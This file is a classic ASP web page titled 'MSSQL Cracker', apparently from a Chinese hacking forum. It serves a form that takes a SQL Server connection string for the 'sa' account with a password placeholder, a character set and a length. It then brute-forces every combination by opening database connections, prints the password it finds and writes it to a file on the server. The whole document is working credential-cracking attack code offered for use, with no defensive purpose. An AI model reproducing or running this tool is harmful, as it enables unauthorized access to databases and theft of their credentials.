<%
'============ ASP MSSQLpw Scanner by 1937 ===================
'http://bbs.1937cn.com/forum.php
'
'
'==========================================================
%>
<style type="text/css">
body,td,th {color: #0000FF;font-family: Verdana, Arial, Helvetica, sans-serif;}
body {background-color: #ffffff;font-size:14px; }
a:link {color: #0000FF;text-decoration: none;}
a:visited {text-decoration: none;color: #0000FF;}
a:hover {text-decoration: none;color: #FF0000;}
a:active {text-decoration: none;color: #FF0000;}
.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
.TextBox {border: 1px solid #084B8E}
.styleRed {color: #FF0000}
</style>
<title>MSSQL Cracker by TNT</title>
<%
Dim Password()
If Request.Form("go") <> "1" Then
%>
<div align="center">Welcome to <a href="http://bbs.1937cn.com/forum.php" TNT blog="_blank">http://bbs.1937cn.com/forum.php</a> </div>
<form name="form1" method="post" action="" onSubmit="form1.Submit.disabled=true;">
ConnStr:
<input name="conn" type="text" id="conn" value="Provider=SQLOLEDB.1;Data Source=127.0.0.1;User ID=sa;Password={PASS};" size="70">
<br>
Char:
<input name="char" type="text" id="char" value="0123456789" size="30">
<br>
Length:
<input name="len" type="text" id="len" value="3" size="4">
<br>
Path:
<input name="path" type="text" value="<%=Server.MapPath("r.txt")%>" size="50">
<input name="CFile" type="checkbox" id="CFile" value="1" checked>
Enablel<br>
<input name="go" type="hidden" id="go" value="1">
<br>
<input name="Submit" type="submit" id="Submit" value=" Run ">
</form>
<%
Else
timer1 = timer
Server.ScriptTimeout = 7776000
ConnStr = Request.Form("Conn")
Char = request.Form("char")
LenChar = Len(Char)
ReDim password(LenChar)
For i = 1 to LenChar
password(i) = Mid(Char, i, 1)
Next
length = CInt(request.Form("len"))
Call LAKE("")
response.Write "Done!<br>Process " & tTime & " s"
If request.Form("CFile") <> "" Then CreateResult("Done!" & vbcrlf & tTime)
End If
Sub LAKE(str)
If Len(str) >= length Then Exit Sub
For j = 1 to LenChar
pass = str & password(j)
If Len(pass) = length Then Call Crack(pass)
Call LAKE(pass)
Next
End Sub
Sub Crack(str)
On Error Resume Next
Set conn = Server.CreateObject("ADODB.connection")
conn.open Replace(ConnStr,"{PASS}",str)
If Err Then
If Err.Number <> -2147217843 Then
response.Write(Err.Description & "<BR>")
response.End()
End If
Else
response.Write("I Get it ! Password is <font color=red>" & str & "</font><BR>Process " & tTime & " s")
If request.Form("CFile") <> "" Then CreateResult(str & vbcrlf & tTime)
response.End()
End If
End Sub
Function tTime()
timer2 = timer
thetime=cstr(int(timer2-timer1))
tTime = thetime
End Function
Sub CreateResult(t)
Set fs = CreateObject("Scripting.FileSystemObject")
Set outfile = fs.CreateTextFile(request.Form("path"))
outfile.WriteLine t
Set fs = Nothing
End Sub
%>